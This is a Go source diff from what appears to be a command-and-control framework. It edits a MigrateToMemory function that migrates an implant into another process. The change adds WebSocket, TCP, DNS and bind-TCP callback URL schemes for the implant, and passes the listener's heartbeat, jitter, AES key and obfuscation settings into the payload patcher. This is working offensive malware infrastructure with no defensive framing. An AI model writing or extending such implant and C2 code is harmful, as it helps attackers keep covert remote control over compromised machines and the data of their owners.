@@ -9,6 +9,7 @@ import (
 	"net"
 	"os"
 	"path/filepath"
+	"strings"
 	"time"
 )
 
@@ -114,10 +115,17 @@ func MigrateToMemory(uuid string, targetProcess string) error {
 			}
 		}
 
-		if ln.Protocol == "WebSocket" {
+		switch strings.ToUpper(ln.Protocol) {
+		case "WS", "WEBSOCKET":
 			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
-		} else {
-			c2url = fmt.Sprintf("%s:%d", host, ln.Port)
+		case "TCP":
+			c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
+		case "DNS":
+			c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
+		case "BIND-TCP", "正向TCP":
+			c2url = fmt.Sprintf("bind://0.0.0.0:%d", ln.Port)
+		default:
+			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
 		}
 		log.Printf("[Migration] Using source listener %s URL: %s", ln.ID, c2url)
 	}
@@ -130,11 +138,18 @@ func MigrateToMemory(uuid string, targetProcess string) error {
 				if host == "" { host = ln.BindIP }
 				if host == "0.0.0.0" || host == "" { host = "127.0.0.1" }
 
-				if ln.Protocol == "WebSocket" {
+				switch strings.ToUpper(ln.Protocol) {
+				case "WS", "WEBSOCKET":
 					c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
 					return false
-				} else if ln.Protocol == "TCP" {
-					c2url = fmt.Sprintf("%s:%d", host, ln.Port)
+				case "TCP":
+					c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
+					return false
+				case "DNS":
+					c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
+					return false
+				case "BIND-TCP", "正向TCP":
+					c2url = fmt.Sprintf("bind://0.0.0.0:%d", ln.Port)
 					return false
 				}
 			}
@@ -145,7 +160,7 @@ func MigrateToMemory(uuid string, targetProcess string) error {
 		c2url = "ws://127.0.0.1:8081/ws"
 	}
 
-	// Fetch security context from parent client or listener
+	heartbeat := 10
 	salt := client.EncryptionSalt
 	obf := client.ObfuscateMode
 	jitter := 30
@@ -154,9 +169,10 @@ func MigrateToMemory(uuid string, targetProcess string) error {
 		if salt == "" { salt = ln.EncryptionSalt }
 		if obf == "" { obf = ln.ObfuscateMode }
 		jitter = ln.HeartbeatJitter
+		heartbeat = ln.HeartbeatInterval
 	}
 
-	patched, err := PatchPayload(raw, c2url, aesKey, 10, jitter, "", false, 0, salt, obf)
+	patched, err := PatchPayload(raw, c2url, aesKey, heartbeat, jitter, "", false, 0, salt, obf)
 	if err != nil {
 		return fmt.Errorf("failed to patch migration template: %v", err)
 	}
